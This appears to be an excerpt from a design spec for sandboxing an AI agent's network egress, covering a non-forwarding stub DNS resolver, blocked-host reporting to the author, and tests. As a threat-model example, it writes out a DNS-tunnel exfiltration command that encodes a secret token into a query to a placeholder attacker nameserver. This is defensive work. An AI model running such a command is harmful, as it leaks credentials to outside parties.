...
| `src/lib/contract/execution_result.zig` | EDIT | Add `blocked_egress: []const BlockedHost` (`{host, reason}`, default empty) so a denied **named** host surfaces to the author on the existing `report` path; **parent-populated** from the stub resolver's denied-lookup record (Dim 3.4), never child-written. |
| `src/zombied` report consumer + `core.zombie_events` | EDIT (small, control-plane) | Persist + expose `blocked_egress` on the run record so the author's run detail can render it. **UI rendering is the last-mile follow-up** (data path lands here). |
...
- **Dimension 3.3 (DNS-tunnel closure)** — the child cannot reach a **forwarding** DNS resolver: name→IP resolution is parent-provided — a **non-forwarding stub** that answers ONLY allowlisted names and forwards nothing upstream (the stub is chosen over static `/etc/hosts` injection so an off-list query can be *recorded* for the author, Dim 3.4); nftables drops port 53 except to that stub. This **closes the DNS-tunnel exfil channel** — `dig $(echo $TOKEN | base64).attacker-ns.com @<resolver>` encodes the secret in the query name and reaches an attacker's authoritative nameserver *through* a forwarding resolver, which the IP-allowlist alone cannot see (the connect target is the *allowed* resolver IP). → Tests `test_no_forwarding_resolver_reachable` + `test_dns_tunnel_query_dropped`
- **Dimension 3.4 (author-facing denial — the end user learns *why* a host was blocked)** — a denied egress is **not silent to the end user**. The parent-provided stub resolver (§3.3) already sees every name the child looks up, *including off-allowlist ones*; for a name not in the resolved allowlist it answers `NXDOMAIN` — so `curl https://api.stripe.com` from `bash` fails **fast at resolution** (no 30-second connect-timeout hang, no lease wall-clock burned on a dead socket) — **and records the denied name**. The **parent** (never the child — Invariant 6) folds those recorded names into the lease's `ExecutionResult` as a structured `blocked_egress: []const BlockedHost` field (`{host, reason}`, default empty), which rides the **existing `report` path** (`ExecutionResult` → `ReportRequest` → `core.zombie_events`) to the author's run-detail surface. The author sees *"blocked egress: api.stripe.com — not in network.allow"* and knows exactly which host to declare. Because the record is **parent-owned**, a prompt-injected child can neither forge nor suppress it. A raw-IP `connect()` (no DNS — the exfil shape) has no name to surface and stays an operator-side `egress_denied` log + counter only (§2.2); the author configures by name, not IP, so a bare-IP denial is not author-actionable by design. This gives `bash`/`git`/`web_fetch` the same legibility `http_request` already has at L7 (`policy_http_request.zig` returns a structured off-list error). *(This biases the §3.3 choice toward the **stub-resolver** option over static `/etc/hosts` injection — only a resolver process can observe and record an off-list query.)* → Tests `test_denied_named_host_surfaced_in_result` + `test_allowed_host_absent_from_blocked_egress` + `test_blocked_egress_record_is_parent_owned`
...
#   name resolution is PARENT-PROVIDED: a non-forwarding stub that answers ONLY allowlisted names
#   (off-list name -> NXDOMAIN, AND the stub RECORDS the denied name for the author — Dim 3.4).
#   NO forwarding resolver is reachable (§3.3).
...
#   denied NAMED host (off-list DNS lookup) -> NXDOMAIN (fast fail) + parent records it into
#                          ExecutionResult.blocked_egress -> author's run detail (Dim 3.4, parent-owned)
...
| Undeclared **named** tool host | the agent dials a host the author forgot to put in `network.allow` (e.g. `api.stripe.com`) | the stub resolver answers `NXDOMAIN` → the tool fails **fast** (not a 30s hang), and the parent records the name into `ExecutionResult.blocked_egress` → the author sees *"blocked: api.stripe.com — add to network.allow"* on the run detail. **Not** a lease failure — the run continues. Caught by `test_denied_named_host_surfaced_in_result`. |
...
| 3.4 | unit + integration-runner | `test_denied_named_host_surfaced_in_result` + `test_allowed_host_absent_from_blocked_egress` + `test_blocked_egress_record_is_parent_owned` | an off-allowlist **named** lookup → `NXDOMAIN` + the name recorded into `ExecutionResult.blocked_egress`; an allowed host leaves `blocked_egress` empty; the child cannot forge/suppress the record (parent-owned) |
...
- [ ] A denied **named** egress surfaces to the author on the run result (`ExecutionResult.blocked_egress`), parent-owned + tamper-proof; an allowed host leaves it empty — verify: `test_denied_named_host_surfaced_in_result` + `test_allowed_host_absent_from_blocked_egress` + `test_blocked_egress_record_is_parent_owned`
